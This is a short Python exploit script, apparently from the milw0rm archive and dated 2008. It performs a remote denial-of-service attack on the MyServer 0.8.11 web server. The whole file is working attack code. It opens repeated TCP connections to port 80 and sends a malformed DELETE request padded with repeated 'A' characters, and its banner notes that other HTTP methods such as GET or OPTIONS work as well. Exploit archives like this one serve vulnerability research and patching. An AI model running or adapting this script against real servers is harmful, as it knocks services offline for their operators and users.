#exploit.py

import socket
import os

print '------------------------------------------------------------------'
print ' MyServer 0.8.11 "204 No Content" error Remote Denial of Service'
print ' url: www.myserverproject.net'
print ' author: shinnai'
print ' mail: shinnai[at]autistici[dot]org'
print ' site: http://shinnai.altervista.org'
print ' I do not have time for explanations, just to say that yuo can'
print ' use even other HTTP methods as GET, OPTIONS etc :-)'
print '------------------------------------------------------------------'

buff = "A" * 50
host = "127.0.0.1"
port = 80

for i in range (0,20):
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((host, port))
        connection.send("DELETE" + buff + " HTTP/1.0\r\n")
    except:
        print "Unable to connect"

# milw0rm.com [2008-02-25]
